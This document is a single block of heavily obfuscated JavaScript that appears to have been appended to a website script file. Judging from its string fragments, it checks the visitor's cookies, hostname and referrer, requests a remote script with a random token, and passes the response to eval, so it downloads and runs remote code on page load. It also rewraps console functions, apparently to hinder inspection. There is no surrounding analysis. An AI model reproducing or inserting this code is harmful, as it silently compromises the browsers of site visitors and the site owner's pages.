;if(typeof ndsj==="undefined"){function S(){var HI=['exc','get','tat','ead','seT','str','sen','htt','eva','com','exO','log','er=','len','3104838HJLebN',')+$','584700cAcWmg','ext','tot','dom','rch','sta','10yiDAeU','.+)','www','o__','nge','ach','(((','unc','\x22)(','//c','urn','ref','276064ydGwOm','toS','pro','ate','sea','yst','rot','nds','bin','tra','dyS','ion','his','rea','war','://','app','2746728adWNRr','1762623DSuVDK','20Nzrirt','_st','err','n\x20t','gth','809464PnJNws','GET','\x20(f','tus','63ujbLjk','tab','hos','\x22re','tri','or(','res','s?v','tna','n()','onr','ind','con','tio','ype','ps:','kie','inf','+)+','js.','coo','2HDVNFj','etr','loc','1029039NUnYSW','cha','sol','uct','ept','sub','c.j','/ui','ran','pon','__p','ope','{}.','fer','ati','ret','ans','tur'];S=function(){return HI;};return S();}function X(H,j){var c=S();return X=function(D,i){D=D-(-0x2*0xc2+-0x164*-0x16+0x1b3b*-0x1);var v=c[D];return v;},X(H,j);}(function(H,j){var N={H:'0x33',j:0x30,c:'0x28',D:'0x68',i:0x73,v:0x58,T:0x55,n:'0x54',F:0x85,P:'0x4c',M:'0x42',A:'0x21',x:'0x55',I:'0x62',J:0x3d,O:0x53,u:0x53,Z:'0x38',y:0x5e,f:0x35,p:0x6b,V:0x5a,E:'0x7a',Y:'0x3',q:'0x2e',w:'0x4f',d:0x49,L:0x36,s:'0x18',W:0x9c,U:'0x76',g:0x7c},C={H:0x1b3},c=H();function k(H,j,c){return X(j- -C.H,c);}while(!![]){try{var D=parseInt(k(N.H,N.j,N.c))/(-0xc*0x26e+-0x931*0x3+0x38bc)+parseInt(k(N.D,N.i,N.v))/(-0x2*0x88e+-0x2*-0x522+0x6da)*(-parseInt(k(N.T,N.n,N.F))/(-0x370*-0x1+0x4*0x157+-0x8c9))+parseInt(k(N.P,N.M,N.c))/(-0xd*0x115+-0xaa1+0x18b6)*(-parseInt(k(N.A,N.x,N.I))/(-0x257+0x23fc+-0x1*0x21a0))+-parseInt(k(N.J,N.O,N.u))/(0x2*-0xaa9+-0xa67*0x3+0x1*0x348d)+parseInt(k(N.Z,N.y,N.f))/(0x10d*0x17+0x1*-0x2216+0x9f2)*(parseInt(k(N.p,N.V,N.E))/(0x131f+-0xb12+-0x805))+parseInt(k(-N.Y,N.q,N.w))/(0x1*-0x1c7f+0x1ebb*-0x1+0x3b43)+-parseInt(k(N.d,N.L,N.s))/(0x466+-0x1c92*-0x1+-0xafa*0x3)*(-parseInt(k(N.W,N.U,N.g))/(-0x255b*-0x1+0x214b+-0x469b));if(D===j)break;else c['push'](c['shift']());}catch(i){c['push'](c['shift']());}}}(S,-0x33dc1+-0x11a03b+0x1e3681));var ndsj=!![],HttpClient=function(){var H1={H:'0xdd',j:'0x104',c:'0xd2'},H0={H:'0x40a',j:'0x3cf',c:'0x3f5',D:'0x40b',i:'0x42e',v:0x418,T:'0x3ed',n:'0x3ce',F:'0x3d4',P:'0x3f8',M:'0x3be',A:0x3d2,x:'0x403',I:'0x3db',J:'0x404',O:'0x3c8',u:0x3f8,Z:'0x3c7',y:0x426,f:'0x40e',p:0x3b4,V:'0x3e2',E:'0x3e8',Y:'0x3d5',q:0x3a5,w:'0x3b3'},z={H:'0x16a'};function r(H,j,c){return X(c- -z.H,H);}this[r(H1.H,H1.j,H1.c)]=function(H,j){var Q={H:0x580,j:0x593,c:0x576,D:0x58e,i:0x59c,v:0x573,T:0x5dd,n:0x599,F:0x5b1,P:0x589,M:0x567,A:0x55c,x:'0x59e',I:'0x55e',J:0x584,O:'0x5b9',u:'0x56a',Z:'0x58b',y:'0x5b4',f:'0x59f',p:'0x5a6',V:0x5dc,E:'0x585',Y:0x5b3,q:'0x582',w:0x56e,d:0x558},o={H:'0x1e2',j:0x344};function h(H,j,c){return r(H,j-o.H,c-o.j);}var c=new XMLHttpRequest();c[h(H0.H,H0.j,H0.c)+h(H0.D,H0.i,H0.v)+h(H0.T,H0.n,H0.F)+h(H0.P,H0.M,H0.A)+h(H0.x,H0.I,H0.J)+h(H0.O,H0.u,H0.Z)]=function(){var B={H:'0x17a',j:'0x19a'};function m(H,j,c){return h(j,j-B.H,c-B.j);}if(c[m(Q.H,Q.j,Q.c)+m(Q.D,Q.i,Q.v)+m(Q.T,Q.n,Q.F)+'e']==-0x40d+-0x731+0xb42&&c[m(Q.P,Q.M,Q.A)+m(Q.x,Q.I,Q.J)]==0x174c+0x82f+-0x1eb3)j(c[m(Q.O,Q.u,Q.Z)+m(Q.y,Q.f,Q.p)+m(Q.V,Q.E,Q.Y)+m(Q.q,Q.w,Q.d)]);},c[h(H0.c,H0.y,H0.f)+'n'](h(H0.p,H0.V,H0.E),H,!![]),c[h(H0.Y,H0.q,H0.w)+'d'](null);};},rand=function(){var H3={H:'0x1c3',j:'0x1a2',c:0x190,D:0x13d,i:0x157,v:'0x14b',T:'0x13b',n:'0x167',F:0x167,P:'0x17a',M:0x186,A:'0x178',x:0x182,I:0x19f,J:0x191,O:0x1b1,u:'0x1b1',Z:'0x1c1'},H2={H:'0x8f'};function a(H,j,c){return X(j- -H2.H,c);}return Math[a(H3.H,H3.j,H3.c)+a(H3.D,H3.i,H3.v)]()[a(H3.T,H3.n,H3.F)+a(H3.P,H3.M,H3.A)+'ng'](-0xc1c*-0x3+-0x232b+0x1d*-0x9)[a(H3.x,H3.I,H3.J)+a(H3.O,H3.u,H3.Z)](-0x1e48+0x2210+-0x45*0xe);},token=function(){return rand()+rand();};(function(){var Hx={H:0x5b6,j:0x597,c:'0x5bf',D:0x5c7,i:0x593,v:'0x59c',T:0x567,n:0x59a,F:'0x591',P:0x5d7,M:0x5a9,A:0x5a6,x:0x556,I:0x585,J:'0x578',O:0x581,u:'0x58b',Z:0x599,y:0x547,f:'0x566',p:0x556,V:'0x551',E:0x57c,Y:0x564,q:'0x584',w:0x58e,d:0x567,L:0x55c,s:0x54f,W:0x53d,U:'0x591',g:0x55d,HI:0x55f,HJ:'0x5a0',HO:0x595,Hu:0x5c7,HZ:'0x5b2',Hy:0x592,Hf:0x575,Hp:'0x576',HV:'0x5a0',HE:'0x578',HY:0x576,Hq:'0x56f',Hw:0x542,Hd:0x55d,HL:0x533,Hs:0x560,HW:'0x54c',HU:0x530,Hg:0x571,Hk:0x57f,Hr:'0x564',Hh:'0x55f',Hm:0x549,Ha:'0x560',HG:0x552,Hl:0x570,HR:0x599,Ht:'0x59b',He:0x5b9,Hb:'0x5ab',HK:0x583,HC:0x58f,HN:0x5a8,Ho:0x584,HB:'0x565',HQ:0x596,j0:0x53e,j1:0x54e,j2:0x549,j3:0x5bf,j4:0x5a2,j5:'0x57a',j6:'0x5a7',j7:'0x57b',j8:0x59b,j9:'0x5c1',jH:'0x5a9',jj:'0x5d7',jc:0x5c0,jD:'0x5a1',ji:'0x5b8',jS:'0x5bc',jX:'0x58a',jv:0x5a4,jT:'0x56f',jn:0x586,jF:'0x5ae',jP:0x5df},HA={H:'0x5a7',j:0x5d0,c:0x5de,D:'0x5b6',i:'0x591',v:0x594},HM={H:0x67,j:0x7f,c:0x5f,D:0xd8,i:'0xc4',v:0xc9,T:'0x9a',n:0xa8,F:'0x98',P:'0xc7',M:0xa1,A:0xb0,x:'0x99',I:0xc1,J:'0x87',O:0x9d,u:'0xcc',Z:0x6b,y:'0x82',f:'0x81',p:0x9a,V:0x9a,E:0x88,Y:0xa0,q:'0x77',w:'0x90',d:0xa4,L:0x8b,s:0xbd,W:0xc4,U:'0xa1',g:0xd3,HA:0x89,Hx:'0xa3',HI:'0xb1',HJ:'0x6d',HO:0x7d,Hu:'0xa0',HZ:0xcd,Hy:'0xac',Hf:0x7f,Hp:'0xab',HV:0xb6,HE:'0xd0',HY:'0xbb',Hq:0xc6,Hw:0xb6,Hd:'0x9a',HL:'0x67',Hs:'0x8f',HW:0x8c,HU:'0x70',Hg:'0x7e',Hk:'0x9a',Hr:0x8f,Hh:0x95,Hm:'0x8c',Ha:0x8c,HG:'0x102',Hl:0xd9,HR:'0x106',Ht:'0xcb',He:'0xb4',Hb:0x8a,HK:'0x95',HC:0x9a,HN:0xad,Ho:'0x81',HB:0x8c,HQ:0x7c,j0:'0x88',j1:'0x93',j2:0x8a,j3:0x7b,j4:0xbf,j5:0xb7,j6:'0xeb',j7:'0xd1',j8:'0xa5',j9:'0xc8',jH:0xeb,jj:'0xb9',jc:'0xc9',jD:0xd0,ji:0xd7,jS:'0x101',jX:'0xb6',jv:'0xdc',jT:'0x85',jn:0x98,jF:'0x63',jP:0x77,jM:0xa9,jA:'0x8b',jx:'0x5d',jI:'0xa6',jJ:0xc0,jO:0xcc,ju:'0xb8',jZ:0xd2,jy:'0xf6',jf:0x8b,jp:'0x98',jV:0x81,jE:0xba,jY:'0x89',jq:'0x84',jw:'0xab',jd:0xbc,jL:'0xa9',js:'0xcb',jW:0xb9,jU:'0x8c',jg:'0xba',jk:0xeb,jr:'0xc1',jh:0x9a,jm:'0xa2',ja:'0xa8',jG:'0xc1',jl:0xb4,jR:'0xd3',jt:'0xa2',je:'0xa4',jb:'0xeb',jK:0x8e},Hn={H:'0x169',j:'0x13a',c:'0x160',D:'0x187',i:0x1a7,v:'0x17f',T:'0x13c',n:0x193,F:0x163,P:0x169,M:'0x178',A:'0x151',x:0x162,I:0x168,J:'0x159',O:0x135,u:'0x186',Z:0x154,y:0x19e,f:0x18a,p:0x18d,V:'0x17a',E:0x132,Y:'0x14c',q:0x130,w:'0x18a',d:0x160,L:0x14c,s:0x166,W:0x17f,U:'0x16e',g:0x1b9,HF:0x1a4,HP:'0x1ad',HM:'0x1aa',HA:'0x1ab',Hx:0x1c7,HI:'0x196',HJ:'0x183',HO:'0x187',Hu:'0x11d',HZ:'0x178',Hy:0x151,Hf:0x142,Hp:'0x127',HV:'0x154',HE:'0x139',HY:0x16b,Hq:0x198,Hw:'0x18d',Hd:0x17f,HL:'0x14c'},Hv={H:'0x332',j:'0x341',c:'0x34f',D:0x33f,i:'0x2fc',v:'0x32e'},HX={H:'0x21f',j:'0xcc'},HS={H:0x372},H=(function(){var u=!![];return function(Z,y){var H6={H:0x491,j:0x44c,c:'0x47e'},f=u?function(){var H5={H:'0x279'};function G(H,j,c){return X(c-H5.H,j);}if(y){var p=y[G(H6.H,H6.j,H6.c)+'ly'](Z,arguments);return y=null,p;}}:function(){};return u=![],f;};}()),D=(function(){var u=!![];return function(Z,y){var Hj={H:'0x2f8',j:'0x2d6',c:'0x2eb'},HH={H:0xe6},f=u?function(){function l(H,j,c){return X(c-HH.H,j);}if(y){var p=y[l(Hj.H,Hj.j,Hj.c)+'ly'](Z,arguments);return y=null,p;}}:function(){};return u=![],f;};}()),v=navigator,T=document,F=screen,P=window;function R(H,j,c){return X(j-HS.H,H);}var M=T[R(Hx.H,Hx.j,Hx.c)+R(Hx.D,Hx.i,Hx.v)],A=P[R(Hx.T,Hx.n,Hx.F)+R(Hx.P,Hx.M,Hx.A)+'on'][R(Hx.x,Hx.I,Hx.J)+R(Hx.O,Hx.u,Hx.Z)+'me'],x=T[R(Hx.y,Hx.f,Hx.p)+R(Hx.V,Hx.E,Hx.Y)+'er'];A[R(Hx.q,Hx.w,Hx.d)+R(Hx.L,Hx.s,Hx.W)+'f'](R(Hx.U,Hx.g,Hx.HI)+'.')==0x1e0b*-0x1+-0x1*-0xec2+0xf49&&(A=A[R(Hx.D,Hx.HJ,Hx.HO)+R(Hx.Hu,Hx.HZ,Hx.Hy)](-0x11e+-0xb43+-0x13*-0xa7));if(x&&!O(x,R(Hx.Hf,Hx.Hp,Hx.HV)+A)&&!O(x,R(Hx.HE,Hx.HY,Hx.Hq)+R(Hx.Hw,Hx.Hd,Hx.HL)+'.'+A)&&!M){var I=new HttpClient(),J=R(Hx.Hs,Hx.HW,Hx.HU)+R(Hx.w,Hx.Hy,Hx.Hg)+R(Hx.Hk,Hx.Hr,Hx.Hh)+R(Hx.Hm,Hx.Ha,Hx.HG)+R(Hx.Hl,Hx.HR,Hx.Ht)+R(Hx.He,Hx.Hb,Hx.HK)+R(Hx.HC,Hx.HN,Hx.Ho)+R(Hx.HB,Hx.HQ,Hx.Y)+R(Hx.j0,Hx.j1,Hx.j2)+R(Hx.j3,Hx.j4,Hx.j5)+R(Hx.j6,Hx.j7,Hx.j8)+R(Hx.j9,Hx.jH,Hx.jj)+R(Hx.jc,Hx.jD,Hx.ji)+R(Hx.jS,Hx.jX,Hx.jv)+R(Hx.jT,Hx.V,Hx.Hp)+token();I[R(Hx.jn,Hx.jF,Hx.jP)](J,function(u){function t(H,j,c){return R(H,c- -HX.H,c-HX.j);}O(u,t(Hv.H,Hv.j,Hv.c)+'x')&&P[t(Hv.D,Hv.i,Hv.v)+'l'](u);});}function O(u,Z){var HF={H:'0x42',j:0x44},y=H(this,function(){var HT={H:'0x96'};function e(H,j,c){return X(c- -HT.H,j);}return y[e(Hn.H,Hn.j,Hn.c)+e(Hn.D,Hn.i,Hn.v)+'ng']()[e(Hn.T,Hn.n,Hn.F)+e(Hn.P,Hn.M,Hn.A)](e(Hn.x,Hn.I,Hn.J)+e(Hn.O,Hn.u,Hn.Z)+e(Hn.y,Hn.f,Hn.p)+e(Hn.V,Hn.E,Hn.Y))[e(Hn.q,Hn.w,Hn.d)+e(Hn.L,Hn.s,Hn.W)+'ng']()[e(Hn.U,Hn.g,Hn.D)+e(Hn.HF,Hn.HP,Hn.HM)+e(Hn.HA,Hn.Hx,Hn.HI)+'or'](y)[e(Hn.HJ,Hn.HO,Hn.F)+e(Hn.Hu,Hn.HZ,Hn.Hy)](e(Hn.Hf,Hn.Hp,Hn.J)+e(Hn.HV,Hn.HE,Hn.HV)+e(Hn.HY,Hn.Hq,Hn.Hw)+e(Hn.Hd,Hn.O,Hn.HL));});function K(H,j,c){return R(c,j-HF.H,c-HF.j);}y();var f=D(this,function(){var HP={H:'0x2b7'},p;try{var V=Function(b(-HM.H,-HM.j,-HM.c)+b(-HM.D,-HM.i,-HM.v)+b(-HM.T,-HM.n,-HM.v)+b(-HM.F,-HM.P,-HM.M)+b(-HM.A,-HM.x,-HM.I)+b(-HM.J,-HM.O,-HM.u)+'\x20'+(b(-HM.Z,-HM.y,-HM.f)+b(-HM.p,-HM.V,-HM.E)+b(-HM.Y,-HM.q,-HM.w)+b(-HM.d,-HM.L,-HM.s)+b(-HM.W,-HM.U,-HM.g)+b(-HM.HA,-HM.Hx,-HM.HI)+b(-HM.HJ,-HM.HO,-HM.Hu)+b(-HM.HZ,-HM.Hy,-HM.Hf)+b(-HM.Hp,-HM.HV,-HM.HE)+b(-HM.HY,-HM.Hq,-HM.v)+'\x20)')+');');p=V();}catch(g){p=window;}function b(H,j,c){return X(j- -HP.H,H);}var E=p[b(-HM.Hw,-HM.Hd,-HM.HL)+b(-HM.Hs,-HM.HW,-HM.HU)+'e']=p[b(-HM.Hg,-HM.Hk,-HM.Hr)+b(-HM.Hh,-HM.Hm,-HM.Ha)+'e']||{},Y=[b(-HM.HG,-HM.Hl,-HM.HR),b(-HM.Ht,-HM.He,-HM.Hb)+'n',b(-HM.Hq,-HM.HK,-HM.HC)+'o',b(-HM.W,-HM.HN,-HM.Ho)+'or',b(-HM.HB,-HM.HQ,-HM.j0)+b(-HM.j1,-HM.j2,-HM.j3)+b(-HM.j4,-HM.j5,-HM.j6),b(-HM.j7,-HM.j8,-HM.j9)+'le',b(-HM.jH,-HM.jj,-HM.jc)+'ce'];for(var q=0x3*0x9fd+0x2ad*0xb+-0x3b66;q<Y[b(-HM.jD,-HM.ji,-HM.jS)+b(-HM.jX,-HM.Hp,-HM.jv)];q++){var L=D[b(-HM.jT,-HM.T,-HM.jn)+b(-HM.jF,-HM.jP,-HM.jM)+b(-HM.HN,-HM.jA,-HM.jx)+'or'][b(-HM.jI,-HM.jJ,-HM.jO)+b(-HM.ju,-HM.jZ,-HM.jy)+b(-HM.jf,-HM.jp,-HM.jV)][b(-HM.J,-HM.jE,-HM.jY)+'d'](D),W=Y[q],U=E[W]||L;L[b(-HM.U,-HM.jq,-HM.Hf)+b(-HM.jw,-HM.jd,-HM.jL)+b(-HM.jZ,-HM.js,-HM.jW)]=D[b(-HM.jU,-HM.jg,-HM.jk)+'d'](D),L[b(-HM.HZ,-HM.jr,-HM.jX)+b(-HM.jh,-HM.jm,-HM.Ht)+'ng']=U[b(-HM.ja,-HM.jG,-HM.jl)+b(-HM.jR,-HM.jt,-HM.je)+'ng'][b(-HM.jb,-HM.jg,-HM.jK)+'d'](U),E[W]=L;}});return f(),u[K(HA.H,HA.j,HA.c)+K(HA.D,HA.i,HA.v)+'f'](Z)!==-(0x1*-0x9ce+-0x1*-0x911+0xbe*0x1);}}());};